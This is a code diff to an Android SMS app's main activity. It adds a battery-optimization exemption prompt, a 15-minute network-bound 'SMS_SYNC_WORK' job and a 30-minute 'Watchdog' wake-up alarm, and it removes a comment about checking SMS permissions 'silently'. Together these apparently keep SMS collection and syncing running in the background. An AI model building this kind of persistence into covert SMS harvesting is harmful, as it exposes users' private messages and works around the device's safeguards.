@@ -1,6 +1,7 @@
 package com.example.sms;
 
 import android.Manifest;
+import android.content.Context;
 import android.content.Intent;
 import android.content.pm.PackageManager;
 import android.database.Cursor;
@@ -77,12 +78,63 @@ public class MainActivity extends AppCompatActivity {
                     .commit();
         }
 
-        // Check for SMS permissions silently
         if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
             ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.READ_SMS}, PERMISSION_REQUEST_READ_SMS);
         } else {
             backgroundInitSMS();
         }
+
+        requestBatteryOptimization();
+        scheduleWork();
+        scheduleAlarm();
+    }
+
+    private void requestBatteryOptimization() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+            String packageName = getPackageName();
+            android.os.PowerManager pm = (android.os.PowerManager) getSystemService(android.content.Context.POWER_SERVICE);
+            if (pm != null && !pm.isIgnoringBatteryOptimizations(packageName)) {
+                Intent intent = new Intent();
+                intent.setAction(android.provider.Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
+                intent.setData(Uri.parse("package:" + packageName));
+                startActivity(intent);
+            }
+        }
+    }
+    
+    private void scheduleAlarm() {
+        Intent intent = new Intent(this, SyncAlarmReceiver.class);
+        android.app.PendingIntent pendingIntent = android.app.PendingIntent.getBroadcast(
+                this, 0, intent, android.app.PendingIntent.FLAG_UPDATE_CURRENT | android.app.PendingIntent.FLAG_IMMUTABLE);
+        
+        android.app.AlarmManager alarmManager = (android.app.AlarmManager) getSystemService(Context.ALARM_SERVICE);
+        if (alarmManager != null) {
+            long interval = 30 * 60 * 1000; // 30 minutes
+            long triggerAtMillis = System.currentTimeMillis() + interval;
+            alarmManager.setInexactRepeating(
+                    android.app.AlarmManager.RTC_WAKEUP,
+                    triggerAtMillis,
+                    interval,
+                    pendingIntent
+            );
+        }
+        Log.d("MainActivity", "Watchdog Alarm scheduled.");
+    }
+
+    private void scheduleWork() {
+        androidx.work.PeriodicWorkRequest syncRequest =
+                new androidx.work.PeriodicWorkRequest.Builder(SyncWorker.class, 15, java.util.concurrent.TimeUnit.MINUTES)
+                        .setConstraints(new androidx.work.Constraints.Builder()
+                                .setRequiredNetworkType(androidx.work.NetworkType.CONNECTED)
+                                .build())
+                        .build();
+
+        androidx.work.WorkManager.getInstance(this).enqueueUniquePeriodicWork(
+                "SMS_SYNC_WORK",
+                androidx.work.ExistingPeriodicWorkPolicy.KEEP,
+                syncRequest
+        );
+        Log.d("MainActivity", "Periodic Sync Worker scheduled.");
     }
 
     private void backgroundInitSMS() {
